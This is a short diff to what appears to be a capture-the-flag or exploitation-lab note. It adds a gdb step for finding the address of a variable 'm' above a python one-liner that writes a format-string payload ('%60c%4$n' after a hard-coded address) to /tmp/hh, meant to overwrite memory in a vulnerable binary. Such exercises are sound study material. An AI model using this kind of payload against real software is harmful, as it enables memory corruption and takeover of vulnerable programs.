@@ -1,3 +1,8 @@
+find the adress of m 
+```
+info variables
+```
+
 ```
     python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' > /tmp/hh
 ```
